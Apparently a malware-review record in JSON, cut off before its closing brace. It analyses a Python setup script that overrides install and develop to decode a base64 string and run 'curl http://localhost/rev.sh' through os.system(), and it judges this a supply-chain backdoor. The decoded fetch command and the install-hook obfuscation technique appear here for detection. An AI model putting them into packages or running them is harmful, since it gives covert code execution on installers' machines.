{
  "purpose": "The code executes a base64-decoded command during package installation or development, specifically running 'curl http://localhost/rev.sh', which indicates an attempt to fetch and execute remote content, potentially malicious.",
  "sources": "The base64 string in 'notmalfunc()' decoded during setup, executed via 'os.system()'.",
  "sinks": "The 'os.system()' call executing the decoded 'curl' command, which could fetch and run malicious scripts or commands.",
  "flows": "The base64 string is decoded in 'notmalfunc()', then passed directly to 'os.system()' during 'install' and 'develop' commands, executing the network request.",
  "anomalies": "Use of base64 encoding to obfuscate a command that makes a network request during package setup; execution of remote commands without validation; the URL points to localhost, which is unusual for remote payloads but still suspicious.",
  "analysis": "The script overrides 'install' and 'develop' commands to run 'notmalfunc()', which decodes a base64 string that results in 'curl http://localhost/rev.sh'. This command is executed via 'os.system()', causing a network request during package installation. The obfuscation via base64 hides the command's intent. The URL pointing to localhost suggests it may be a placeholder or a local backdoor, but the pattern of executing remote commands during setup is a red flag. The code lacks validation or sanitization, increasing security risks. Given the behavior, the code demonstrates malicious intent, potentially allowing remote code execution or backdoor access.",
  "conclusion": "The code contains malicious behavior: during setup, it decodes and executes a command that fetches a script from a URL, indicative of a supply chain attack or backdoor. The obfuscation and execution pattern confirm malicious intent, warranting high malware and security risk scores.",
